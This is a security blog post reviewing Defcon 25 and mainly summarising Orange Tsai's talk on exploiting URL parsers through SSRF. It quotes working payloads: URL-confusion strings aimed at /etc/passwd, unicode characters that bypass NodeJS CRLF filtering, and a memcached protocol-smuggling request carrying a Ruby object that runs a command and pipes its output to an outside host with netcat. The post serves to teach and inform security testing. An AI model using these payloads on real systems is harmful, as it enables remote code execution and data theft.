<!DOCTYPE HTML><html><head><title>Hackallthethings.xyz</title><meta charset="utf-8" /><meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" /><link rel="stylesheet" href="/assets/css/main.css" /><link href="/assets/css/syntax.css" rel="stylesheet" /></head><body class="is-preload"><div id="header"><div class="top"><div id="logo"> <span class="image avatar48"><img src="/assets/images/avatar.jpg" alt="" /></span><h1 id="title">Hland</h1><p></p></div><nav id="nav"><ul><li><a href="/" id="top-link"><span class="icon fa-user">whoami</span></a></li><li><a href="/library"><span class="icon fa-book">Library</span></a></li><li><a href="/weblog"><span class="icon fa-rss">Weblog</span></a></li></ul></nav></div><div class="bottom"><ul class="icons"><li><a href="https://twitter.com/vladthegad" target="_blank" _rel="noreferrer noopen" class="icon fa-twitter"><span class="label">Twitter</span></a></li><li><a href="https://lmgtfy.com/?q=Privacy+is+not+dead" target="_blank" _rel="noreferrer noopen" class="icon fa-facebook"><span class="label">Facebook</span></a></li><li><a href="https://hackerone.com/hland" target="_blank" _rel="noreferrer noopen" class="icon"><span class="label">HackerOne</span></a></li></ul></div></div><section id="weblog" class="two"><div class="container"><header><h2>Defcon 25 Takeaways</h2><p>Writtten by on July 30, 2017</p></header><section class="post"><p>This July I had the pleasure of attending Defcon anniversary 25th time and these are my take-aways from the conference.</p><p>My goal when going to Defcon is to get inspired and motivated by the great work of others and to be able to incorporate new ideas and techniques into existing work. There is a myriad of great work being presented or taught at Defcon and it is overwhelming to take it all in. Especially when adding in the masses of people lining up and wandering around making a semi-introvert wanna crawl back into bed..</p><h2 id="notable-presentations">Notable presentations:</h2><h3 id="orange-tsai---a-new-era-of-exploiting-url-parser-in-trending-programming-languages">Orange Tsai - A new Era of Exploiting URL Parser in trending programming languages</h3><p>This little gem presents techniques for finding and exploiting SSRF which are directly applicable in testing applications. Abusing the discrepancy between RFCs 2396 and 3986 in libraries Orange Tsai has found that many libraries are vulnerable to these tricks in different situations. This results in payloads like the following:</p><div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://foo@evil.com:80@google.com/
http://hackallthethings.xyz/－＊/etc/passwd
http://hackallthethings.xyz/ＮＮ/etc/passwd


</code></pre></div></div><p>Note that the -* characters are actually unicode characters for <code class="highlighter-rouge">%0d</code> and <code class="highlighter-rouge">%0a</code> which break the NodeJS protection against CRLF injection.</p><div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python
&gt;&gt;&gt; print(u'\uff0d')
－
&gt;&gt;&gt; print(u'\uff0a')
＊
&gt;&gt;&gt; print(u'\uff2e')
Ｎ
</code></pre></div></div><p>List of <a href="https://en.wikipedia.org/wiki/List_of_Unicode_characters">unicode characters here</a></p><p>Another example that abuses decimal support in <code class="highlighter-rouge">gethostbyname()</code> (RFC1035):</p><div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt;&gt;&gt; print host
\o\r\a\n\g\e.t\w
&gt;&gt;&gt; socket.gethostbyname(host)
'50.116.8.239'
</code></pre></div></div><p>Orange also chained SSRF to exploit internal services via protocol smuggling and libraries vulnerable to CRLF injection.</p><p>Example:</p><div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://0:8000/composer/send_email
?to=orange@chroot.org&amp;url=http://127.0.0.1:11211/%0D%0Aset%20githubproductionsearch/queries/code_query%3A857be82362ba02525cef496458ffb09cf30f6256%3Av3%3Acount%200%2060%20150%0D%0A%04%08o%3A%40ActiveSupport%3A%3ADeprecation%3A%3ADeprecatedInstanceVariableProxy%07%3A%0E%40instanceo%3A%08ERB%07%3A%09%40srcI%22%1E%60id%20%7C%20nc%20orange.tw%2012345%60%06%3A%06ET%3A%0C%40linenoi%00%3A%0C%40method%3A%0Bresult
</code></pre></div></div><p>There are tons of examples in this talk and I have yet to dig through them all and test them, but it’s definitely lots of stuff that will improve testing of SSRF and inspire new tricks and ideas. Also there are some good references in this talk: <a href="https://docs.google.com/document/d/1v1TkWZtrhzRLy0bYXBcdLUedXGb9njTNIJXa3u9akHM/edit#heading=h.xm4muaotv626">SSRF Bible</a></p><h3 id="r">r</h3><p>All content is available at the <a href="https://media.defcon.org/DEF%20CON%2025/">Defcon Media Server</a>.</p></section></div></section><script src="/assets/js/jquery.min.js"></script> <script src="/assets/js/jquery.scrolly.min.js"></script> <script src="/assets/js/jquery.scrollex.min.js"></script> <script src="/assets/js/browser.min.js"></script> <script src="/assets/js/breakpoints.min.js"></script> <script src="/assets/js/util.js"></script> <script src="/assets/js/main.js"></script></body></html>
